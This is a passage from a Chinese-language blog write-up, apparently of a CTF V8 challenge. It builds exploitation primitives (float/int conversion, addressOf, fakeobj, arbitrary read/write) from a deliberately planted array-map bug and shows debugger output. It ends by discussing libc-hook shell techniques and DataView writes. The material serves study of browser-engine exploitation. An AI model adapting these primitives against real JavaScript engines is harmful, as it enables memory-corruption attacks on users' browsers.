+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var Buffer=new ArrayBuffer(0x10);</span><br><span class="line">var Float64=new Float64Array(Buffer);</span><br><span class="line">var BigUint64=new BigUint64Array(Buffer);</span><br><span class="line">function f2i(f)</span><br><span class="line">&#123;</span><br><span class="line">    Float64[0]=f;</span><br><span class="line">    return BigUint64[0];</span><br><span class="line">&#125;</span><br><span class="line">function i2f(i)</span><br><span class="line">&#123;</span><br><span class="line">    BigUint64[0]=i;</span><br><span class="line">    return Float64[0];</span><br><span class="line">&#125;</span><br><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return i.toString(16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="原语构造"><a href="#原语构造" class="headerlink" title="原语构造"></a>原语构造</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var float_array = [1.1];</span><br><span class="line">var float_array_map = float_array.Myread();</span><br><span class="line">var obj_array = [float_array];</span><br><span class="line">var obj_array_map = obj_array.Myread();</span><br></pre></td></tr></table></figure>
+
+<p> 先构造一些基本的变量，方便之后使用</p>
+<p>通过上述漏洞，我们思考如何利用</p>
+<p>浮点数组和对象数组对属性的区别在于浮点数组中存储的是纯粹的数值，而对象数组中则是数值或指针。用下标均可访问，因此，有一种泄露对象地址的办法。<br>我们先将想泄露的对象<code>a</code>放入一个对象数组<code>b[]</code>内，将该对象数组<code>b[]</code>的map改为浮点数组，之后直接对对象数组<code>b[0]</code>的下标访问即可得到泄露的地址。<br>这就是构造一个原语</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function AddressOf(obj)</span><br><span class="line">&#123;</span><br><span class="line">    obj_array[0] = obj;</span><br><span class="line">    obj_array.Mywrite(float_array_map);</span><br><span class="line">    let addr = f2i(obj_array[0]);</span><br><span class="line">    obj_array.Mywrite(obj_array_map);//recover</span><br><span class="line">    return addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>类似地，也可以将一个内存地址伪造成一个对象，对该对象的访问也就是对特定内存地址的访问。<br>对于给定的内存地址a，先将其当作浮点数存入浮点数组，再将浮点数组将其改为对象数组，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function fakeobj(addr)&#123;</span><br><span class="line">    float_array[0] = i2f(addr+0x1n);</span><br><span class="line">    float_array.Mywrite(obj_array_map);</span><br><span class="line">    let obj = float_array[0];</span><br><span class="line">    float_array.Mywrite(float_array_map);</span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在根据上面两个方法来尝试实现任意读写<br>对于一个已知的内存地址<code>rw_addr</code>，我们考虑以下方法：</p>
+<p>伪造一个对象<code>fake_obj</code>，并使该对象的<code>elements</code>指向<code>rw_addr</code>的内存地址。<br>计算得到<code>elements=rw_addr+0x10</code><br>在起初，适合我们控制的应该是一个<code>PACKED_ELEMENTS</code>数组<code>fake_array</code>，在其内部设置<code>fake_obj</code>，可调试得到<code>fake_obj_addr=fake_array_addr-0x30</code>，创建<code>fake_obj</code>之后我们还可以通过<code>fake_array</code>修改<code>fake_obj</code>的<code>elements</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var fake_array=[</span><br><span class="line">    float_array_map,//map</span><br><span class="line">    0,//properties</span><br><span class="line">    i2f(0x1n),//element</span><br><span class="line">    i2f(0x100000000n),</span><br><span class="line">    1.1,</span><br><span class="line">    2.2</span><br><span class="line">];</span><br><span class="line">fake_obj_addr=AddressOf(fake_array)-0x30n;</span><br><span class="line">var fake_obj=fakeobj(fake_obj_addr);</span><br><span class="line">%DebugPrint(fake_obj);</span><br><span class="line">&gt; 0x095872e8ec19 &lt;JSArray[1]&gt;</span><br><span class="line">pwndbg&gt; tele 0x095872e8ec18</span><br><span class="line">00:0000│  0x95872e8ec18 —▸ 0x1e7fbe802ed9 ◂— 0x40000231b707c01</span><br><span class="line">01:0008│  0x95872e8ec20 ◂— 0</span><br><span class="line">02:0010│  0x95872e8ec28 ◂— 1</span><br><span class="line">03:0018│  0x95872e8ec30 ◂— 0x100000000</span><br><span class="line">04:0020│  0x95872e8ec38 ◂— 0x3ff199999999999a</span><br></pre></td></tr></table></figure>
+
+<p>看gdb也能看出来是成功了，构造成函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function read(addr)&#123;</span><br><span class="line">    fake_array[2]=i2f(addr-0x10n+0x1n);</span><br><span class="line">    let leak_data=fake_obj[0];</span><br><span class="line">    console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span><br><span class="line"></span><br><span class="line">    return leak_data;</span><br><span class="line">&#125;</span><br><span class="line">function write(addr,data)&#123;</span><br><span class="line">    fake_array[2]=i2f(addr-0x10n+0x1n);</span><br><span class="line">    fake_obj[0]=i2f(data);</span><br><span class="line">    console.log(&quot;[*] write to: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="如何getshell"><a href="#如何getshell" class="headerlink" title="如何getshell"></a>如何getshell</h2><p>这一段其实应该放到上面，不然前面的就跟没有路瞎走一样</p>
+<p>传统堆栈上是system或者one_gadget，v8解释器本质上也是一个c++程序，所以按传统堆栈肯定是没毛病的<br>也是泄露出libc地址，然后改写hook函数就行<br>也有师傅找出了两种泄露方法<br>但是，但是……我主机现在是ubuntu24.04，glibc2.39，这个版本早就把hook函数移除了，真想打只能找其他办法，但是很难的辣<br>等过一个月换了个新硬盘我加装个ubuntu20再来战</p>
+<p>但是那位师傅也提了关于写入问题的改进，在写高地址时出现问题。<br>原因是我们使用的write在写入时是用的FloatArray的写入，而Double类型的浮点数在处理7f开头的高地址时会出现将低20位与运算为0，从而导致写入失败的错误(可能是这个原因)<br>结果就是，直接用FloatArray方式向高地址写入会不成功。</p>
+<p>解决办法：借助DataView对象</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/26/2025-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="prev" title="Glacierctf-2024">
+                  <i class="fa fa-angle-left"></i> Glacierctf-2024
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/03/05/IOT%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" rel="next" title="">
+                   <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
